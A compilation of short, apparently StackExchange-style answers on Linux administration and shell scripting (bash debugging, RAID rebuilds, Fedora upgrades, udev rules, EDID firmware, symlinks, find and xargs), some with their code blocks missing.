ls already performs that lookup . you can perform a user information lookup from the command line with getent passwd . if ls shows a user id instead of a user name , it is because there is no user by that name . filesystems store user ids , not user names . if you mount a filesystem from another system , or if a file belongs to a now-deleted user , or if you passed a numerical user id to chown , you can have a file that belongs to a user id that does not have a name . on a shared host , you may have access to some files that are shared between several virtual machines , each with their user database . this is a bit weird ( why share files but not the users that own them ? ) , but it is technically possible .
raid is resyncing hdd there are 2 hints : " state : active , resyncing " " rebuild status : 17% complete " it seems that your system is rebuilding your array ( or it did not finished syncing it during installation ) . it should be bootable again once the array is finished rebuilding . for the time being , you could ty to boot in degraded mode at least . you can use ' bootdegraded=true ' in grub ( press e to edit the boot line and add the option ) . note : i had this as a comment , but i think this is the answer to your question , so i moved it .
from my experience , the closest-to-working setup is flashmovie package used with an swf-wrapped movie . and it will only work with adobe 's reader under linux . you will need to use \RequirePackage{flashmovie}  at the very top of your main tex-file - it has to be sourced before beamer , otherwise other things will break .
your if statments are not running the way that you think . you can turn up the debugging for bash scripts like this by including the command set -x and subsequently turn it off with set +x . example so we first add debugging like so : #!/bin/bash ## DEBUG set -x xsetwacom --set 16 touch False ....  i then run your script , i called it ex.bash , so i invoke it : $ ./ex.bash  bash tries to execute this line : if [ "$istouch"=="off" ]  and from the output , we can see that bash is getting confused . it is running with the string 'xsetwacom --get 15 touch==off' . + '[' 'xsetwacom --get 15 touch==off' ']'  the arguments to the == should not be touching it like that . bash is notoriously picky on things like this . so put some space before and after like this :  if [ "$istouch" == "off" ] elif [ "$istouch" == "on" ]  so now this looks a bit better : + '[' 'xsetwacom --get 15 touch' == off ']' + '[' 'xsetwacom --get 15 touch' == on ']'  however you do not want to compare the stirng $istouch , you want to compare the results of the command that this string represents , so change the top of the script to this : .... xsetwacom --set 16 touch False istouch=$(xsetwacom --get 15 touch) if [ "$istouch" == "off" ] ....  now we are running the command xsetwacom and storing the results in $istouch . i do not have these devices so i get a message about device 15 . but this is what the script does now : hopefully this gives you some insight into : how to debug your script better understanding of the bash syntax more indepth look at the if statements you might be left wondering why the if statement even matched at all . the problem is that if you give the [ command a single string , it will treat this as a truth if the string is not empty , and the if statement will fall into its then section . example $ [ "no"=="yes" ] &amp;&amp; echo "they match" they match $ [ "notheydont"=="yes" ] &amp;&amp; echo "they match" they match  it may appear that there is a equality check occurring here , but there is not . [ some-string ] is short for [ -n some-string ] , that is a test for some-string being [ n ] on-empty . using set -x shows us this : $ set -x; [ "notheydont"=="yes" ] &amp;&amp; echo "they match"; set +x + '[' notheydont==yes ']' + echo 'they match' they match + set +x  if we put some space between the arguments to the equality check : it now works as expected !
if you make that last line : renderPDF.drawToFile(drawing, "file.pdf", autoSize=0)  you will get a nice blue circle on your page . the normal parameter value for autoSize is 1 which results in the pdf being the same size as the drawing . the problem is with your svg file having no size parameters . you can e.g. change the svg openining tag to : &lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="1000px" width="1000px"&gt;  to get a similar ( visible ) result without using autoSize=0
one of the easiest and safest thing to do is to clear the package manager cache . you did not specify which operating system or distribution you use so i will give examples for the mainstream distributions : debian/ubuntu : apt-get clean  fedora/red hat : yum clean  opensuse : zypper clean  most , if not all , other package managers in other distributions have a similar functionality . another thing you can relatively easy do is delete old kernel versions . most distributions keep the old kernels installed when installing a new kernel . here is a guide how to remove old kernels for debian and fedora : http://www.cyberciti.biz/faq/proper-way-to-remove-old-linux-kernels/
quite generally speaking , all operations happen in ram first - file systems are cached . there are exceptions to this rule , but these rather special cases usually arise from quite specific requirements . hence until you start hitting the cache flushing , you will not be able to tell the difference . another thing is , that the performance depends a lot on the exact file system - some are targeting easier access to huge amounts of small files , some are efficient on real-time data transfers to and from big files ( multimedia capturing/streaming ) , some emphasise data coherency and others can be designed to have small memory/code footprint . back to your use case : in just one loop pass you spawn about 20 new processes , most of which just create one directory/file ( note that () creates a sub-shell and find spawns cat for every single match ) - the bottleneck indeed is not the file system ( and if your system uses aslr and you do not have a good fast source of entropy your system 's randomness pool gets depleted quite fast too ) . the same goes for fuse written in perl - it is not the right tool for the job .
just a guess ( this is bash specific ) : the documentation for the huponexit shell option says if set , bash will send sighup to all jobs when an interactive login shell exits on my system , it does not seem to be set by default . you can check with shopt -p huponexit  if the output includes -u , it is unset .
you need to include a colon to select based on index . try this : bind-key u select-window -t :2 
before fedora 17 none of the red hat distros prior to fedora 17 included the ability to do dist-upgrades as you have asked . this had been a long discussed option on many peoples ' wish list but had never been implemented . but before we start a clarification . . . according to the upgrading topic in the wiki , there was a method where you could put a dvd in your system for the next version of fedora , and anaconda would attempt to upgrade your system . having tried this method on numerous occasions i would not consider this to be on par with the dist-upgrade available in the debian/ubuntu distros which actually worked very well . additionally having maintained rhel , fedora and centos systems for over the past decade , i would never even consider using this method for anything . it simply did not work . so typically people would do one of the following : rawhide use the rawhide release , which is the bleeding edge version , similar to how sid is in debian . rawhide offers rolling releases in the sense that it always has the latest versions of packages , but it is by no means meant to be used as a day to day distro , it is really meant only for testing . stay with a single release just live with this fact and stay up to date as long as the distro stayed around , using yum . you can use yum to both apply any pending updates and/or update a single package . additionally , yum can be used to install new packages too . apply all pending updates ( assumes yes to all prompts ) : sudo yum -y update  update a single package : sudo yum -y update apache\*  install a new package : sudo yum -y install apache\*  software update applet if you want to perform updates using a gui you can use the software updater tool that shows up in your taskbar . this tool essentially does the same thing as the yum -y update above , and can be run on demand using the following command : gpk-update-viewer  re-install as a new version comes out , you had manually do a fresh install and take care to copy any data and configurations forward to the new system . preupgrade make use of preupgrade tool . this tool essentially just collected your setups and the names of the packages you installed and would assist you in applying them to a new installation . see @joeldavis ' answer for this technique as well . note : this is no longer an option starting with fedora 18 though so you have been warned . fedora 17 and after beginning with 17 you can now do rolling releases . fedup new in fedora 17/18 is a tool called fedup ( fedora upgrader ) which purports to do " dist-upgrades " similar to debian/ubuntu distros . fedup ( fedora upgrader ) is the name of a new system for upgrading fedora installs in fedora 18 and above releases . it replaces all of the currently recommended upgrade methods ( preupgrade and dvd ) that have been used in previous fedora releases . anaconda , the fedora installer does have not any in-built upgrade functionality in fedora 18 or above releases . it has been completely delegated to fedup . currently , fedup is capable of upgrading fedora 17 installs to fedora 18 using a networked repository , similar to how preupgrade worked . more methods for upgrade are currently planned and this page will be updated as those features are completed . rolling releases vs . versioned releases the op asked a follow-up question where he wanted me to elaborate on the following phrase : " beginning with 17 you can now do rolling releases . " when i made that comment i meant one thing and the phrase " rolling releases " really means something else . when i wrote that i meant " rolling release " to mean that you could now roll from one point release of fedora ( say 17 ) to version 18 . most distros such as debian and ubuntu provide this facility now . however in looking up the description of what " rolling releases " actually means on wikipedia , i am now more educated on the subject . excerpt from wikipedia . . . a rolling release or rolling update development model refers to a continually developing software system ; this is instead of a standard release development model which uses software versions that must be reinstalled over the previous version . rolling software , instead , is continually updated , in contrast to standard release software which is upgraded between versions . . . . so from a purists standpoint , debian , ubuntu , fedora , are not " rolling releases " . they are point standard released software that provide tools to assist in the upgrading from one point release to another . the op also asked the following question debian is only " kind of " rolling release if you use sid . rolling release = no versions , packages are just dumped into the distro from the upstream asap , right ? so debian is the complete opposite of a rolling release , ubuntu as well . fedora rawhide is also kind-of a rolling release , but i already knew that ( and do not want to use it , if that is what you were referring to ) . just so that it is clear to any future readers . even the development branches of debian ( aka . sid ) and fedora ( aka . rawhide ) are not " rolling releases " . sure you can use them as such but they are merely a development " area " where new packages of software that may be incorporated into a future release can be presented to the community in a centralized way . the level of testing that would go into a package being placed in one of these branches is less stringent than say when a package shows up as an update in a true " rolling release " distro such as archlinux ( would be my expectation ) . here 's the section of the wikipedia page that covers the use of development branches for standard release distros : the distinction between rolling release software distributions and development branches of standard release software distributions is often overlooked by users inexperienced with rolling distributions . this can lead to confused comments , such as : " distro-x is a rolling distribution if you use its development branch " — where distro-x is a standard release distribution . even in rare cases where the development branch is a rolling ( versus the more common cyclical ) development branch , this does not make the distribution rolling . unlike standard release distributions , rolling release distributions do not have development branches .
you probably will not be able to manually un-mount devices that contain root and/or home filesystems : too many processes will have one or the other as their current working directory . so that can not be your situation . disadvantages : requires root to mount or unmount . easy to forget to do , causing extra puzzlement . advantages : a disk un-mounted when a power failure occurs would be less likely to have its filesystem ( s ) messed up . the filesystem ( s ) are quiescent . easier to do fsck-style filesystem cleanup - do not have to do it during boot .
an application needs two things to open a window on an x display . it needs to know the location of the x display ; that is conveyed by the DISPLAY environment variable . it also needs to authenticate with the x server . this is conveyed through a cookie , which is a secret value generated by the x server when it starts and stored in a file that only the user who started the x server can access . the default cookie file is ~/.Xauthority . if your x server is using the default cookie file location , then adding Environment=XAUTHORITY=/home/dogs/.Xauthority will work ( assuming /home/dogs is the home directory of the user who is logged in under x ) . if you need to find the location , see can i launch a graphical program on another user 's desktop as root ? and open a window on a remote x display ( why “cannot open display” ) ? alternatively , running the program as the user who is running the x server will work , provided that the cookie file is in the default location ( if not , you will have to locate the cookie file , like in the root case ) . add the User directive ( e . g . User=dogs ) . of course the service will not run if there is not an x display by that number owned by the user you specify . it is rather bizarre to start a gui program from systemd . it was not designed for this . gui programs live in an x session , started by a user . systemd is for system processes . you should experiment with daemons instead .
you can do this by arranging for the device to be mounted with the sync option . but it is not such a good idea , because this can wear cheap usb flash drives very fast ( this has been discussed on the linux kernel mailing list ) . recent versions of linux have the flush option for fat filesystems , which is somewhere between sync and async: it causes all delayed writes to be flushed as soon as the disk becomes inactive . the flush option is on by default in ubuntu 10.04 , but not in debian wheezy . see also should i unmount a usb drive before unplugging it ?
i would use an initramfs . ( http://www.kernel.org/doc/documentation/filesystems/ramfs-rootfs-initramfs.txt ) many linux distributions use an initramfs ( not to be confused with an initrd , they are different ) during the boot process , mostly to be able to start userspace programs very early in the boot process . however you can use it for whatever you want . the benefit of an initramfs over an initrd is that an initramfs uses a tmpfs filesystem while an initrd uses a ram block device . the key difference here is that an initrd you must preallocate all the space for the filesystem , even if youre not going to use all that space . so if you dont use the filesystem space , you waste ram , which on an embedded device , is often a scarce resource . tmpfs is a filesystem which runs out of ram , but only uses as much ram as is currently in use on the filesystem . so if you delete a file from a tmpfs , that ram is immediately freed up . now normally an initramfs is temporary , only used to run some programs extremely early in the boot process . after those programs run , control is turned over to the real filesystem running on a physical disk . however you do not have to do that . there is nothing stopping you from running out of the initramfs indefinitely .
unix domain sockets are intentionally present to reduce transport overhead . they allow to exchange data between applications and thus related to application layer in [tcp/ip model][1] . there is no need for transport protocol to ensure ordering , reliability or flow control . you do not need network access layer as recipient of a message transfer is a process in the same machine .
you could be vulnerable if using a gui with softwares that supports/implements " auto execute " feature , as explained by jon larimer at shmoocon ( 2011 ) . there is an interesting paper/vid about his research here : http://blogs.iss.net/archive/shmoocon2011.html
/dev/sda1 is mounted . you will not be able to do anything while it is mounted . reboot to a live cd . you can create a raid1 volume from an existing filesystem without losing the data . it has to use the 0.9 or 1.0 superblock format , as the default 1.2 format needs to place the superblock near the beginning of the device , so the filesystem can not start at the same location . see how to set up disk mirroring ( raid-1 ) for a full walkthrough . you will need to ensure that there is enough room for the superblock at the end of the device . the superblock is in the last 64kb-aligned 64kb of the device , so depending on the device size it may be anywhere from 64kb to 128kb before the end of the device . run tune2fs -l /dev/sda1 and multiply the “block count” value by the “block size” value to get the filesystem size in bytes . the size of the block device is 241489048½ kb , so you need to get the filesystem down to at most 241488960 kb . if it is larger than that , run resize2fs /dev/sda1 241488960K before you run mdadm --create . one the filesystem is short enough , you can create the raid1 device , with a suitable metadata format . mdadm --create /dev/md0 --level=1 --raid-devices=2 --metadata=1.0 /dev/sda1 missing 
dmidecode contain private information : serial number ipmi support but this information does not make your system vulnerable .
nothing : there are three standard file descriptions , stdin , stdout , and stderr . they are assigned to 0 , 1 , and 2 respectively . what you are seeing there is an artifact of the way ls(1) works : in order to read the content of the /proc/self/fd directory and display it , it needs to open that directory . that means it gets a file handle , typically the first available . . . thus , 3 . if you were to run , say , cat on a separate console and inspect /proc/${pid}/fd for it you would find that only the first three were assigned .
if the file is literally called secret\r-.tar.gz , mv "secret\r-.tar.gz" ../ should have worked . if the \r is really a carriage return , you need to have a literal carriage return ( and not an escape ) : mv $'secret\r-.tar.gz' .. 
i do not grasp why your rule is so complex ? especially this section in the first line you match the environment variable ID_MODEL which is only seen by udev against USB_Mouse . in the following three lines you assign values to environment variables . again only seen by udev and the executed command synclient if the rule is applied . i am pretty sure that this rule is never applied ( you can check this by parsing udev 's log file . ) since it is likely that there is no variable ID_MODEL with content USB_Mouse accessible unless you set ID_MODEL in the udev environment previously . i suggest that you match against the action , the vendor-id and the product-id of your mouse , which will suffice in most cases . then your rule looks like ACTION=="add", ATTRS{idVendor}=="&lt;idVendor&gt;", ATTRS{idProduct}=="&lt;idProduct&gt;", RUN+="/usr/bin/synclient TouchpadOff=1"  you can get &lt;idVendor&gt; and the &lt;idProduct&gt; by parsing the output of lsusb -v  i do not remember if the given hex-values are allowed in the classical form 0xffff . i always take only the part behind 0x in my rules .
duplication question ( with answer ) stackexchange-url the manpage for bash v3.2.48 says : [ . . . ] the format for arithmetic expansion is :  $((expression))  the old format $ [ expression ] is deprecated and will be removed in upcoming versions of bash . so $ [ . . . ] is old syntax that should not be used anymore in addition to that answer : http://manual.cream.org/index.cgi/bash.1#27 info relating to bash versions : here is some info about bash man pages ( its hard to find info on what version each one is referring to ) : ops link : http://www.tldp.org/guides.html bash guide for beginners version : 1.11 author : machtelt garrels , last update : dec 2008 sth ( 74.6k rep ) quoting bash v3.2.48 from stackexchange-url note : more info about [ ] vs ( ( ) ) here : http://lists.gnu.org/archive/html/bug-bash/2012-04/msg00033.html a link i found : http://www.gnu.org/software/bash/manual/ last updated august 22 , 2012 http://www.gnu.org/software/bash/manual/bash.html#arithmetic-expansion
here 's what i would do : run ldd /usr/bin/Xorg you should get a line that looks like this : libz.so.1 =&gt; /usr/lib/libz.so.1 (0xb7357000)  if ldd claims that it can not resolve what file libz.so.1 is in , then uninstall and reinstall zlib: pacman -R -f zlib pacman -S zlib  if ldd can find a specific libz.so.1 , then check to see if that file constitutes a broken symbolic link : ls -l /usr/lib/libz . so . 1 ( or whatever ldd told you that libz . so . 1 resolves to ) . on my arch boxes , /usr/lib/libz . so . 1 is a symbolic link of libz . so . 1.2.6 . if /usr/lib/libz . so . 1 links to some weird place , like a home directory , track down why - that should not happen . ensure that whatever file that ldd resolves libz . so . 1 to actually exists , and has contents . i get this : if the link exists , but the linked-to libz . so . 1.2.6 does not exist , perhaps you can do the two pacman command sequence above and get everything back . i guess i would advise against just doing the two pacman commands , until you understand what is going on . something must have changed , unless this is a new installation , and somehow the zlib package did not get installed .
you have an extra space in this line : x = $(( $x + 1))  the shell is trying to run the program x , which appears to be an x server ( mac os 's standard file system is not case sensitive , so i imagine it is actually running X ) . you need to do this : x=$(( $x + 1)) 
instead of installing ubuntu , try lubuntu . this is from their page : lubuntu is a fast and lightweight operating system developed by a community of free and open source enthusiasts . the core of the system is based on linux and ubuntu . lubuntu uses the minimal desktop lxde , and a selection of light applications . we focus on speed and energy-efficiency . because of this , lubuntu has very low hardware requirements .
gvfs provides a layer just below the user applications you use like firefox . this layer is called a virtual filesystem and basically presents to firefox , thunderbird and pidgin a common layer that allows them to see local file resource and remote file resource as a single set of resources . meaning your access to the resource whether on your local machine or the remote machine would be transparent to the user . although this layer is mostly there to make it easier for application developers to code to a single set of interfaces and not have to distinguish between local and remote file system and their low-level code . for the user this could mean that the same file manager you use to browse your local files , could also be used to browse files on a remote server . as a simplified contrast , on windows i can browse my local files with explorer , but to browse files on an ftp server i would need a separate application .
question1 $ awk -F'_' 'NF &gt; 1 {print $2}' file venkat venkat3  question2 $ awk -F'_' ' NR == FNR {a[$1];next} ($2 in a) {print $2} ' file file venkat venkat3 
generally , yes . if your vm is running off native disks or partitions , it may be as simple as pointing your bootloader to it . otherwise , you will need to copy the data . for some vm formats , there are tools to mount the vm disk on the host ( e . g . xmount ) . for other formats , the simplest way to get the data is to treat the vm as any old machine and boot a live cd in it . then your os must be able to boot on the metal . unix installations are generally fairly hardware-independent ( as long as you stay with the same processor type ) . you need to have the right drivers , to configure the bootloader and maybe /etc/fstab properly . see for example moving linux install to a new computer .
disabling priorities allowed " yum install httpd-devel " to work . ps : i now have priorities as does this seem ok ?
add the following to your ~/.bashrc file : the first section truncates the cd history mechanism 's custom history file if it is gotten bigger than 500 lines since the last time we looked at it . we can not use bash 's built-in history because it does not include timestamps , which you need in order to get the " in the last 3 hours " behavior . the two bash functions do things we cannot do in the perl code below , which otherwise does all the heavy lifting . the only tricky bit here is the readlink call , which canonicalizes the paths you use . we have to do that so that cd $HOME ; cd ; cd ~ ; cd ../$USER results in 4 instances of the same path in the cd history , not four different entries . the aliases are just convenience wrappers for the functions . now the really tricky bit : save this to a file called cdhistpick , make it executable , and put it somewhere in your PATH . you will not execute it directly . use the cdh alias for that , as it passes in a necessary argument via pick_cwd_from_history() . how does it work ? ummmm , exercise for the reader ? : ) to get your first requirement , the hotkey , you can use any macro recording program you like for your os of choice . just have it type cdh and press enter for you . or , you can run cdh yourself , since it is easy to type . if you want a simpler but less functional alternative that will work everywhere , get into the habit of using bash 's reverse incremental search feature , ctrl - r . press that , then type " cd " ( without the quotes , but with the trailing space ) to be taken back to the previous cd command . then each time you hit ctrl - r , it takes you back to the cd command prior to that . in this way , you can walk backwards through all the cd commands you have given , within the limits of bash 's history feature . say : $ echo $HISTFILESIZE  to see how many command lines bash history will store for you . you might need to increase this to hold 3 hours worth of command history . to search forward through your command history after having stepped backwards through it , press ctrl - s . if that does not work on your system , it is likely due to a conflict with software flow control . you can fix it with this command : $ stty stop undef  that prevents ctrl-s from being interpreted as the xoff character . the consequence of this is that you can then no longer press ctrl-s to temporarily pause terminal output . personally , the last time i used that on purpose was back in the days of slow modems . these days with fast scrolling and big scroll-back buffers , i only use this feature by accident , then have to spend a second remembering to press ctrl - q to get the terminal un-stuck . : )
you are doing small random writes , which is pretty much the slowest thing you can do on a spinning disk , so i would say your throughput meets ( my ) expectations . your avgrq-sz size is 15.35 , which means your average request is 15.35 x the sector size of your sata disk ( most commonly 512 bytes , but possibly 4096 bytes on a very new sata disk ) , so you are writing 15.35 x 512 bytes = 7,859.2 bytes ( on average ) per request , times the 383 writes/second iostat is reporting gives you 3,010,073.6 bytes ( we are multiplying by an average , so that is where the . 6 bytes comes from ) . and 3,010,073.6 bytes/second is 2.87mb/s . how many writes you can do per second is going to depend on how much the disk needs to move the heads , but roughly speaking you are approaching the maximum number of writes your device can make in a second . higher write speeds on spinning disks happen when you combine a small number of writes per second with a large avgrq-sz . if this is a critical performance issue for you , i would suggest investigating the various ssd options that generally will give much better performance on a workload like this .
i would gander a guess that it is there for fat , file allocation table . but if you look at wikipedia the " f " stands for " fixed " as in " fixed disks " . excerpt - http://en.wikipedia.org/wiki/fdisk for computer file systems , fdisk ( for " fixed disk" ) is a command-line utility that provides disk partitioning functions . in versions of the windows nt operating system line from windows 2000 onwards , fdisk is replaced by more advanced tool called diskpart . similar utilities exist for unix-like systems . window 's fdisk ? granted the above has more to do with the windows/dos variant but the term " fixed disk " makes a lot of sense , since hard drives were often termed " fixed " in the olden days . " fixed disk " definition the definition of " fixed disk " also says the same . excerpt - http://www.thefreedictionary.com/fixed+disk noun 1 . fixed disk - a rigid magnetic disk mounted permanently in a drive unit other sources saying the same thing : http://www.computerhope.com/jargon/f/fixeddis.htm http://www.wisegeek.org/what-is-a-fixed-disk.htm#slideshow http://en.wikipedia.org/wiki/hard_disk_drive original origins of " fixed disk " wikipedia 's page on hard disk drives also had this nugget : excerpt in 1961 ibm introduced the model 1311 disk drive , which was about the size of a washing machine and stored two million characters on a removable disk pack . users could buy additional packs and interchange them as needed , much like reels of magnetic tape . later models of removable pack drives , from ibm and others , became the norm in most computer installations and reached capacities of 300 megabytes by the early 1980s . non-removable hdds were called fixed disk drives .
he is saying it is bound by a 64-bit type , which has a maximum value of ( 2 ^ 64 ) - 1 unsigned , or ( 2 ^ 63 ) - 1 signed ( 1 bit holds the sign , +/- ) . the type is not FILE ; it is what the implementation uses to track the offset into the file , namely off_t , which is a typedef for a signed 64-bit type . 1 ( 2 ^ 63 ) - 1 = 9223372036854775807 . if a terabyte is 1000 ^ 4 bytes , that is ~9.2 million tb . presumably the reason a signed type is used is so that it can hold a value of -1 ( for errors , etc ) , or a relative offset . functions like fseek() and ftell() use a signed long , which on 64-bit gnu systems is also 64-bits . 1 . see types.h and typesizes.h in /usr/include/bits .
the right place to set options for the ( /this ) printer , is in /opt/brother/Printers/mfc9340cdw/inf/ brmfc9340cdwrc . the problem of always resulting in a duplextumble printing , was forced by the respective code-line ( BRDuplex=DuplexTumble ) in this configurations file . setting the option in question to BRDuplex=DuplexNoTumble , and restarting the cupsd service ( in my case , using rc-service cupsd restart for openrc ) results in double-sided prints binded along a document 's long-edge . i came up to check for a file named like br ( model name ) rc only after reading this section of a relevant ubuntu-wiki page : http://wiki.ubuntuusers.de/brother/drucker#problembehebung
the easiest way to link to the current directory as an absolute path , without typing the whole path string would be ln -s "$(pwd)/foo" ~/bin/foo_link  the target argument for the ln -s command works relative to the symbolic link 's location , not your current directory . it helps to imagine that the created symlink simply holds the text you provide for the target argument . therefore , if you do the following : cd some_directory ln -s foo foo_link  and then move that link around mv foo_link ../some_other_directory ls -l ../some_other_directory  you will see that foo_link tries to point to foo in the directory it is residing in . this also works with symbolic links pointing to relative paths . if you do the following : ln -s ../foo yet_another_link  and then move yet_another_link to another directory and check where it points to , you will see that it always points to ../foo . this is the intended behaviour , since many times symbolic links might be part of a directory structure that can reside in various absolute paths . in your case , when you create the link by typing ln -s foo ~/bin/foo_link  foo_link just holds a link to foo , relative to its location . putting $(pwd) in front of the target argument 's name simply adds the current working directory 's absolute path , so that the link is created with an absolute target .
this article looks like it will do exactly what you are looking for http://www.raspberrypi-spy.co.uk/2012/06/auto-login-auto-load-lxde/
i have found the output of sshd and other core services in ' journalctl ' . see more at the arch wiki entry for systemd : https://wiki.archlinux.org/index.php/systemd#journal
it is sufficient to add the attributes mentioned . needless question .
do not -exec mv the directory which is currently being examined by find . it seems that find gets confused when you do that . workaround : first find the directories , then move them . cd "/mnt/user/New Movies/" find -type f \( -name "*.avi" -or -name ".*mkv" \) -mtime +180 \ -printf "%h\0" | xargs -0 mv -t /mnt/user/Movies  explanation : -printf prints the match according to the format string . %h prints the path part of the match . this corresponds to the "${0%/*}" in your command . \0 separates the items using the null character . this is just precaution in case the filenames contain newlines . xargs collects the input from the pipe and then executes its arguments with the input appended . -0 tells xargs to expect the input to be null separated instead of newline separated . mv -t target allows mv to be called with all the source arguments appended at the end . note that this is still not absolutely safe . some freak scheduler timing in combination with pipe buffers might still cause the mv to be executed before find moved out of the directory . to prevent even that you can do it like this : background explanation : i asume what happens with your find is following : find traverses the directory /mnt/user/New Movies/ . while there it takes note of the available directories in its cache . find traverses into one of the subdirectories using the system call chdir(subdirname) . inside find finds a movie file which passes the filters . find executes mv with the given parameters . mv moves the directory to /mnt/user/Movies . find goes back to parent directory using the system call chdir(..) , which now points to /mnt/user/Movies instead of /mnt/user/New Movies/ find is confused because it does not find the directories it noted earlier and throws up a lot of errors . this assumption is based on the answer to this question : find -exec mv stops after first exec . i do not know why find just stops working in that case and throws up errors in your case . different versions of find might be the explanation .
assuming gnu or bsd ls : ls -lAtr /foo 
the idiom i use is if ( $?prompt ) then # interactive commands here endif  note that it is spelled $prompt ( lowercase ) , not $PROMPT . if $prompt is always set , then one of your startup files might be setting it unconditionally . it should go inside the if ( $?prompt ) test too , e.g. if ( $?prompt ) then set prompt='%B%m%b %C3&gt;' # interactive commands here endif  testing if the output is a terminal might work too . if ({ test -t 0 }) then # interactive commands here endif 
use a regex as shown below . it finds words containing one or more of your specified punctuation marks and prints out the word and the first matching punctuation mark . you can extend it as you see fit . if [[ "$word" =~ ^.*([!?.,])+.*$ ]] then echo "Found word: $word containing punctuation mark: ${BASH_REMATCH[1]}" fi 
in vim you can use [ and ] to quickly travel to nearest unmatched bracket of the type entered in the next keystroke . so [ { will take you back up to the nearest unmatched "{" ; ] ) would take you ahead to the nearest unmatched " ) " , and so on .
did you source the ~/.bash_login after modifying it ? editing a file does not automatically load it into the current shell . try running : source ~/.bash_login  just starting a new terminal emulator may not source ~/.bash_profile ; it depends on how the terminal program is invoked .
when you run ls without arguments , it will just open a directory , read all the contents , sort them and print them out . when you run ls * , first the shell expands * , which is effectively the same as what the simple ls did , builds an argument vector with all the files in the current directory and calls ls . ls then has to process that argument vector and for each argument , and calls access(2)¹ the file to check it is existence . then it will print out the same output as the first ( simple ) ls . both the shell 's processing of the large argument vector and ls 's will likely involve a lot of memory allocation of small blocks , which can take some time . however , since there was little sys and user time , but a lot of real time , most of the time would have been spent waiting for disk , rather than using cpu doing memory allocation . each call to access(2) will need to read the file 's inode to get the permission information . that means a lot more disk reads and seeks than simply reading a directory . i do not know how expensive these operations are on your gpfs , but as the comparison you have shown to ls -l which has a similar run time to the wildcard case , the time needed to retrieve the inode information appears to dominate . if gpfs has a slightly higher latency than your local filesystem on each read operation , we would expect it to be more pronounced in these cases . the difference between the wildcard case and ls -l of 50% could be explained by the ordering of inodes on the disk . if the inodes were laid out successively in the same order as the filenames in the directory and ls -l stat ( 2 ) ed the files in directory order before sorting , ls -l would possibly read most of the inodes in a sweep . with the wildcard , the shell will sort the filenames before passing them to ls , so ls will likely read the inodes in a different order , adding more disk head movement . it should be noted that your time output will not include the time taken by the shell to expand the wildcard . if you really want to see what is going on , use strace(1): strace -o /tmp/ls-star.trace ls * strace -o /tmp/ls-l-star.trace ls -l *  and have a look which system calls are being performed in each case . ¹ i do not know if access(2) is actually used , or something else such as stat(2) . but both probably require an inode lookup ( i am not sure if access(file, 0) would bypass an inode lookup . )
where is /lib/firmware ? the final resting place for your edid mode firmware should be under /lib/firmware/edid . however , many linux distributions place the example edid mode-setting firmware source and the makefile under the directory for the linux kernel documentation . for fedora , this is provided by the kernel-doc package and resides under /usr/share/doc/kernel-doc-3.11.4/Documentation/EDID . after you compile the firmware for your monitor , you can place the edid binary anywhere that is accessable to grub upon boot , but the convention is /lib/firmware/edid/ . can i tweak an existing edid . bin file to match my monitor 's resolution ? the edid.bin files are in binary format so the correct way to tweak it would not be intuitive . how can i make an edid file from scratch ? the post you provided links to the official kernel documentation for building your custom edid file . the same instructions are also provided in the HOWTO.txt file in the kernel documentation directory referenced above . essentially you edit one of the example firmware files , say 1024x768.S , providing the parameters for your monitor . then compile it with the provided Makefile and configure grub to use the new firmware . for me , there were two tricky bits to accomplishing this . the first one is where to find the edid source file that needs to be compiled . this was answered for fedora above . the second tricky bit is finding the correct values to place in 1024x768.S for your monitor . this is achieved by running cvt to generate your desired modeline and then doing a little arithmetic . for a resolution of 1600x900 with 60 hz refresh rate and reduced blanking ( recommended for lcds ) , you would have : you can match the last line of this output to the instructions in HOWTO.txt: the 2nd - 5th numbers in the last line of the cvt output ( 1600 1648 1680 1760 ) are the four " htimings " parameters ( hdisp hsyncstart hsyncend htotal ) and the 6th - 9th numbers ( 900 903 908 926 ) are the four " vtimings " parameters ( vdisp vsyncstart vsyncend vtotal ) . lastly , you will need to compile the firmware a second time in order to set the correct crc value in the last line ( see the HOWTO.txt for details ) .
you can try something like this code : echo "scale = 4; 3.5678/3" | bc | tr '\\n' ' '  setting scale for bc is supposed to do the rounding job . you can substitute the division part with your desired command . the output of bc is again piped to tr , which converts the newline ( \\n ) to white space . for the above command i get the following output : 1.1892 user@localhost:~/codes$ 
the “blockcount” value is the i_blocks field of the struct ext2_inode . this is the value that is returned to the stat syscall in the st_blocks field . for historical reasons , the unit of that field is 512-byte blocks — this was the filesystem block size on early unix filesystems , but now it is just an arbitrary unit . you can see the value being incremented and decremented depending solely on the file size further down in fs/stat.c . you can see this same value by running stat /device3/test70 ( “blocks : 88” ) . the file in fact contains 18 blocks , which is as expected with a 4kb block size ( the file is 71682 bytes long , not sparse , and 17 × 4096 \&lt ; 71682 ≤ 18 × 4096 ) . it probably comes out as surprising that the number of 512-byte blocks is 88 and not 141 ( because 140 × 512 \&lt ; 71682 ≤ 141 × 512 ) or 144 ( which is 18 × 4096/512 ) . the reason has to do with the calculation in fs/stat.c that i linked to above . your script creates this file by seeking repeatedly past the end , and for the i_blocks field calculation , the file is sparse — there are whole 512-byte blocks that are never written to and thus not counted in i_blocks . ( however , there is not any storage block that is fully sought past , so the file is not actually sparse . ) if you copy the file , you will see that the copy has 144 such blocks as expected ( note that you need to run cp --sparse=never , because gnu cp tries to be clever and seeks when it sees expanses of zeroes ) . as to the number of extents , creating a file the way you do by successive seeks past the end is not a situation that filesystems tend to be optimized for . i think that the heuristics in the filesystem driver first decide that you are creating a small file , so start by reserving space one block at a time ; later , when the file grows , the heuristics start reserving multiple blocks at a time . if you create a larger file , you should see increasing large extents . but i do not know ext4 in enough detail to be sure .
try something like this : $ ssh -t yourserver "$(&lt;your_script)"  the -t forces a tty allocation , $(&lt;some_file) reads the whole file and in this cases passes the content as one argument to ssh , which will be executed by the remote user 's shell . works for me , not sure if it is universal though .
generally , a keyring is a secure password store , that is encrypted with a master password . once you input the master password , the keyring gets decrypted and all the passwords inside it are available to the application accessing the keyring . on gnome/ubuntu the seahorse application can be used to look at the keyring and the master password is the same with your user 's password so you do not get asked about it anymore . most likely your system 's keyring password does not match your user 's password , or the integration is somehow broken . you can try to cancel it and see if you still have access to your saved website passwords . most likely you will be asked for the master password again , as soon as you attempt to use a saved password .
usually : they are writable by the owner ( root for /bin , /usr/bin , . . . ) they executable and readable by everyone else but your question should instead be : who should be able to modify the directory ? who should be able to read the content and execute the binaries ? once you answer these questions the permissions are straightforward . an example :
